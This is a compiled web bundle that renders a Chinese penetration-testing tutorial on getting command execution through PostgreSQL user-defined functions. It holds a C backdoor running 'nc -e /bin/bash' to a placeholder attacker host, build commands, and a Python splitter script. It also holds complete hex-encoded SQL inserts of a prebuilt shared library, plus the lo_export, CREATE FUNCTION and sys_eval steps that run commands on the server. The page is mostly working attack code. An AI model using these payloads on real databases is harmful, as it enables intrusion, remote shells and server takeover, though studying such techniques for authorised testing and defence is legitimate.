\u67e5\u770b\u6267\u884c\u7684\u7ed3\u679c\uff0c\u5982\u679c\u662f\u53cd\u5f39shell\u7b49\u65e0\u56de\u663e\u7684\uff0c\u53ef\u4ee5\u5ffd\u7565\u8fd9\u4e00\u6b65\n"})}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119161909656",src:c(85903).A+"",width:"1638",height:"378"})}),"\n",(0,s.jsx)(f.hr,{}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119162044527",src:c(45095).A+"",width:"1542",height:"1536"})}),"\n",(0,s.jsx)(f.h4,{id:"udf\u63d0\u6743",children:"UDF\u63d0\u6743"}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsx)(f.p,{children:"Userdefined function"}),"\n"]}),"\n",(0,s.jsx)(f.p,{children:"\u5f53postgresql\u7248\u672c\u9ad8\u4e8e8.2\u5b58\u5728\u5b89\u5168\u673a\u5236\u65e0\u6cd5\u8c03\u7528\u7cfb\u7edflibc.so.6\u6240\u4ee5\u9700\u8981\u81ea\u5df1\u5229\u7528UDF\u8fdb\u884c\u547d\u4ee4\u6267\u884c"}),"\n",(0,s.jsx)(f.p,{children:"\u7b2c\u4e00\u6b65\u53ef\u4ee5\u5148\u67e5\u770bpostgresql\u652f\u6301\u7684\u6269\u5c55\u8bed\u8a00:"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"select * from pg_language;\n"})}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{children:" lanname  | lanowner | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator | lanacl\n----------+----------+---------+--------------+---------------+-----------+--------------+--------\n internal |       10 | f       | f            |             0 |         0 |         2246 |\n c        |       10 | f       | f            |             0 |         0 |         2247 |\n sql      |       10 | f       | t            |             0 |         0 |         2248 |\n plpgsql  |       10 | t       | t            |         12394 |     12395 |        12396 |\n"})}),"\n",(0,s.jsx)(f.p,{children:"\u652f\u6301C\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528C\u7f16\u8bd1\u4e00\u4e2a\u6076\u610f\u7684so\u6587\u4ef6\uff0c\u7136\u540e\u8ba9psql\u52a0\u8f7d\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684"}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsxs)(f.p,{children:["[!TIP|style",":flat","]"]}),"\n",(0,s.jsxs)(f.p,{children:[(0,s.jsx)(f.a,{href:"#noso",children:"\u4e0d\u60f3\u81ea\u5df1\u7f16\u8bd1so"}),"\uff0c\u53ef\u4ee5\u627e\u7f51\u4e0a\u522b\u4eba\u7f16\u8bd1\u597d\u7684\uff0c\u4f46\u662f\u6ce8\u610f\u6709\u98ce\u9669\uff1a",(0,s.jsx)(f.a,{href:"https://github.com/Dionach/pgexec/tree/master/libraries",children:"https://github.com/Dionach/pgexec/tree/master/libraries"})]}),"\n"]}),"\n",(0,s.jsx)(f.p,{children:"\u53cd\u5f39shell\u540e\u95e8\u793a\u4f8b\uff1a"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-C",children:'#include "postgres.h"\n#include "fmgr.h"\n#include <stdlib.h>\n\n#ifdef PG_MODULE_MAGIC\nPG_MODULE_MAGIC;\n#endif\n\ntext *exec()\n{\n    system("nc -e /bin/bash vpsIPaddress 2333");\n}\n'})}),"\n",(0,s.jsxs)(f.p,{children:["\u9700\u8981\u5b58\u5728",(0,s.jsx)(f.code,{children:"postgres.h"}),"\u5934\u6587\u4ef6\uff0c\u6240\u4ee5\u7f16\u8bd1\u7684\u76ee\u5f55\u5e94\u4e3a\u5b58\u5728",(0,s.jsx)(f.code,{children:"postgres.h"}),"\u5934\u90e8\u8c03\u7528\u7684\u5e93"]}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-shell",children:'find ./ -name "postgres.h"\n'})}),"\n",(0,s.jsx)(f.p,{children:"\u7f16\u8bd1"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-shell",children:"gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so\nstrip -sx udf.so #\u7f29\u51cfso\u6587\u4ef6\u5927\u5c0f\n"})}),"\n",(0,s.jsx)("p",{id:"noso",children:"\u5c06\u6587\u4ef6hex\u540e\u53bb\u9664\\n"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-shell",children:'cat udf.so | xxd -ps | tr -d "\\n" > test.txt\n'})}),"\n",(0,s.jsx)(f.p,{children:"\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u5c06udf.so\u6587\u4ef6\u5206\u5272\u6210\u6bcf2048\u5b57\u8282\u7684\u5757,\u6700\u540e\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u4e0d\u6ee1\u8db32048\u5b57\u8282\u4e0d\u9700\u8981\u8003\u8651."}),"\n",(0,s.jsxs)(f.blockquote,{children:["\n",(0,s.jsx)(f.p,{children:"[!NOTE]"}),"\n",(0,s.jsxs)(f.p,{children:["\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u5c0f\u4e8e2048?\u662f\u56e0\u4e3a\u5728postgresql\u9ad8\u7248\u672c\u5904\u7406\u4e2d,",(0,s.jsx)(f.strong,{children:"\u5982\u679c\u5757\u4e4b\u95f4\u5c0f\u4e8e2048,\u9ed8\u8ba4\u4f1a\u75280\u53bb\u586b\u5145\u8ba9\u5757\u8fbe\u52302048\u5b57\u8282\u6240\u4ee5\u4e0a\u4f20\u7684\u6587\u4ef6\u624d\u4f1a\u4e00\u76f4\u521b\u5efa\u51fd\u6570\u5931\u8d25"}),"."]}),"\n"]}),"\n",(0,s.jsx)(f.p,{children:"\u7528python\u811a\u672c\u53bb\u5206\u5272udf.so\u6587\u4ef6,2\u4e2a16\u8fdb\u5236\u6570\u662f\u4e00\u4e2a\u5b57\u8282\u6240\u4ee5\u6309\u71674096\u4e2a16\u8fdb\u5236\u6570\u5206\u5272\uff1a"}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-python",children:"#~/usr/bin/env python 2.7\n#-*- coding:utf-8 -*-\nimport sys\nfrom random import randint\nnumber = randint(1000, 9999)\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print \"Usage:python \" + sys.argv[0] + \"inputfile\"\n        sys.exit()\n    fileobj = open(sys.argv[1],'rb')\n    i = 0\n    t = -1\n    s = ''\n    for b in fileobj.read():\n        i = i + 1\n        s += b\n        if i % 4096 == 0:\n            t = t + 1\n            print 'insert into pg_largeobject values ({number}, {block}, decode(\\'{payload}\\',\\'hex\\'));\\n'.format(number=number, block=t, payload=s)\n            s = ''\n    fileobj.close()\n"})}),"\n",(0,s.jsx)(f.p,{children:"\u5206\u5272\u5b8c\u6210\u540e\u6309\u7167\u4e0b\u6587\u4e2d\u7684sql\u8bed\u53e5\u6267\u884c\uff1a"}),"\n",(0,s.jsxs)(f.ol,{children:["\n",(0,s.jsx)(f.li,{children:"\u5199\u5165\u5bf9\u8c61"}),"\n",(0,s.jsx)(f.li,{children:"\u521b\u5efa\u6587\u4ef6"}),"\n",(0,s.jsx)(f.li,{children:"\u5efa\u7acb\u51fd\u6570"}),"\n",(0,s.jsx)(f.li,{children:"\u6267\u884c\u547d\u4ee4"}),"\n",(0,s.jsx)(f.li,{children:"\u6e05\u7406\u51fd\u6570"}),"\n"]}),"\n",(0,s.jsx)(f.hr,{}),"\n",(0,s.jsxs)(f.p,{children:["\u8fd9\u91cc\u6211\u76f4\u63a5\u7ed9\u51fahex\u5206\u7247\u8fc7sql\u8bed\u53e5\u76f4\u63a5\u5199\u5165\u5373\u53ef\u521b\u5efa\u6210\u529f\uff089.6\u7248\u672c\u6d4b\u8bd5\u6709\u6548\uff0c\u5982\u679c\u76ee\u6807\u662f\u66f4\u52a0\u65b0\u7684\u7248\u672c\u9700\u8981\u5bf9\u5e94\u5b89\u88c5",(0,s.jsx)(f.code,{children:"postgresql-dev"}),"\u6269\u5c55\u5305\u7f16\u8bd1\u4ee3\u7801\uff09"]}),"\n",(0,s.jsx)(f.pre,{children:(0,s.jsx)(f.code,{className:"language-sql",children:"SELECT lo_create(9023);\n\ninsert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200', 'hex'));\ninsert into pg_largeobject values (9023, 1, decode('0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ffffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff', 'hex'));\ninsert into pg_largeobject values (9023, 2, decode('ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420e080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex'));\ninsert into pg_largeobject values (9023, 3, decode('00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex'));\ninsert into pg_largeobject values (9023, 4, decode('181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a60000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000', 'hex'));\ninsert into pg_largeobject values (9023, 5, decode('d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000', 'hex'));\n\nSELECT lo_export(9023, '/tmp/testeval.so');\n\n\n-- \u521b\u5efa\u547d\u4ee4\nCREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/testeval.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;\n-- \u6267\u884c\u547d\u4ee4\nselect sys_eval('id');\n-- \u5220\u9664\u547d\u4ee4\ndrop function sys_eval;\n"})}),"\n",(0,s.jsx)(f.p,{children:(0,s.jsx)(f.img,{alt:"image-20220119163757705",src:c(15041).A+"",width:"1458",height:"254"})})]})}function h(e={}){const{wrapper:f}={...(0,d.R)(),...e.components};return f?(0,s.jsx)(f,{...e,children:(0,s.jsx)(t,{...e})}):t(e)}},85903:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119161909656-37b8b133df25a0407b30b5f166cf50be.png"},91258:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119161416610-333279bb06c7228c1b20b8a0d11e3d9d.png"},98152:(e,f,c)=>{c.d(f,{A:()=>n});const n=c.p+"assets/images/image-20220119160535248-12054359b3665c1e273969018bb126cd.png"}}]);